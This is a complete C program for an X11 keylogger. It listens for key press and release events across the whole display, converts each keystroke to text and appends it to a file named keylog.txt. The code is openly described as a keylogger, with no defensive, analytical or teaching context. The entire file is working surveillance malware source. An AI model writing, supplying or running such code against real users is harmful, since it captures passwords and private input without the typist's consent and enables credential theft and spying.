#include <X11/Xlib.h>
#include <X11/Xutil.h>  // For XLookupString
#include <X11/keysym.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

FILE *log_file;

void log_key(const char *event_type, const char *key) {
    // Print to console
    printf("%s: %s\n", event_type, key);
    
    // Log to file
    fprintf(log_file, "%s: %s\n", event_type, key);
    fflush(log_file);  // Ensure it's immediately written to file
}

char* get_key_string(XKeyEvent *event, Display *display) {
    static char buf[128];
    KeySym keysym;
    int len = XLookupString(event, buf, sizeof(buf), &keysym, NULL);  // Convert keypress to string

    if (len > 0) {
        buf[len] = '\0';  // Null-terminate the string
        return buf;
    } else {
        return XKeysymToString(keysym);  // Handle special keys (like arrows, function keys)
    }
}

int main() {
    Display *display;
    Window root;
    XEvent event;

    display = XOpenDisplay(NULL);  // Open connection to X server
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display\n");
        exit(1);
    }

    root = DefaultRootWindow(display);  // Get the root window

    // Open log file for writing
    log_file = fopen("keylog.txt", "a");
    if (log_file == NULL) {
        fprintf(stderr, "Unable to open log file\n");
        exit(1);
    }

    time_t current_time = time(NULL);
    fprintf(log_file, "Keylogger started at %s\n", ctime(&current_time));
    fflush(log_file);  // Write immediately

    // Only listen for keyboard events, without grabbing the entire keyboard
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);  // Listen for key events globally

    printf("Keylogger started. The keyboard can still be used by the user.\n");

    while (1) {
        XNextEvent(display, &event);  // Wait for the next event
        if (event.type == KeyPress) {
            char *key = get_key_string(&event.xkey, display);  // Get key string
            if (key != NULL) {
                log_key("Key Pressed", key);  // Log key press
            }
        }
        if (event.type == KeyRelease) {
            char *key = get_key_string(&event.xkey, display);  // Get key string
            if (key != NULL) {
                log_key("Key Released", key);  // Log key release
            }
        }
    }

    // Close log file on exit
    fclose(log_file);
    XCloseDisplay(display);  // Close connection to X server
    return 0;
}
